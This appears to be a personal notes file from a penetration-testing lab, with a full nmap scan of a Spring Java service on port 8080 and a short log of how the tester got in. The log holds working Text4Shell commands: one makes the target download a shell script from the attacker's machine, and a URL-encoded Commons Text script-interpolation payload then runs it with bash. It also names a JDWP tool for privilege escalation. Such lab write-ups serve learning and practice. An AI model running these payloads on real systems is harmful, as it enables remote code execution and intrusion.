# LOOT:
# NMAP:
```
Nmap scan report for 192.168.245.150
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: application/json;charset=UTF-8
|     Date: Thu, 20 Feb 2025 16:29:45 GMT
|     Connection: close
|     {"timestamp":"2025-02-20T16:29:45.982+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/plain;charset=UTF-8
|     Content-Length: 19
|     Date: Thu, 20 Feb 2025 16:29:45 GMT
|     Connection: close
|     {"api-status":"up"}
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Thu, 20 Feb 2025 16:29:45 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 830
|     Date: Thu, 20 Feb 2025 16:29:45 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 800
|     Date: Thu, 20 Feb 2025 16:29:45 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body
|_http-favicon: Spring Java Framework
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=2/20%Time=67B7587B%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,98,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/plain;cha
SF:rset=UTF-8\r\nContent-Length:\x2019\r\nDate:\x20Thu,\x2020\x20Feb\x2020
SF:25\x2016:29:45\x20GMT\r\nConnection:\x20close\r\n\r\n{\"api-status\":\"
SF:up\"}")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OP
SF:TIONS\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2020\x20Feb\x202025\x20
SF:16:29:45\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,3C6,"HT
SF:TP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nConte
SF:nt-Language:\x20en\r\nContent-Length:\x20830\r\nDate:\x20Thu,\x2020\x20
SF:Feb\x202025\x2016:29:45\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\
SF:"en\"><head><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Ver
SF:sion\x20Not\x20Supported</title><style\x20type=\"text/css\">h1\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo
SF:nt-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Tahom
SF:a,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;
SF:}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;backgroun
SF:d-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-ser
SF:if;background:white;color:black;font-size:12px;}\x20a\x20{color:black;}
SF:\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;background-color
SF::#525D76;border:none;}</style></head><body><h1")%r(FourOhFourRequest,11
SF:3,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20application/json;charset=UT
SF:F-8\r\nDate:\x20Thu,\x2020\x20Feb\x202025\x2016:29:45\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n{\"timestamp\":\"2025-02-20T16:29:45\.982\+0000\",
SF:\"status\":404,\"error\":\"Not\x20Found\",\"message\":\"No\x20message\x
SF:20available\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak\"}")%r(S
SF:ocks5,3BB,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u
SF:tf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20800\r\nDate:\x20T
SF:hu,\x2020\x20Feb\x202025\x2016:29:45\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\
SF:x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/c
SF:ss\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-
SF:color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-
SF:serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{f
SF:ont-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76
SF:;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color
SF::black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-
SF:serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahom
SF:a,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a\x
SF:20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;
SF:background-color:#525D76;border:none;}</style></head><body");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/20%OT=22%CT=1%CU=41578%PV=Y%DS=4%DC=T%G=Y%TM=67B7
OS:592F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578
OS:ST11NW7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   22.91 ms 192.168.45.1
2   22.19 ms 192.168.45.254
3   22.32 ms 192.168.251.1
4   22.39 ms 192.168.245.150
```
# ENUMERATION:
# COAS:
# LOG:
- Discovered that semicolons break the request
- Create reverse shell on kali
- got onto machine with:
	```
	python text4shell.py -u 'http://192.168.188.150:8080/search?query=' -c 'wget 192.168.45.200/shell' -m 'rce'
	```
- Executed shell with:
	```
	curl '192.168.188.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D' 
	```
- Found this exploit after identifying jdwp with linpeas:
	- https://github.com/IOActive/jdwp-shellifier
- Realized the service is only accessible internally on port 8000 which is not externally exposed
- used the following for privesc:
- ![[Pasted image 20250222163720.png]]
- ![[Pasted image 20250222163737.png]]
- ![[Pasted image 20250222163744.png]]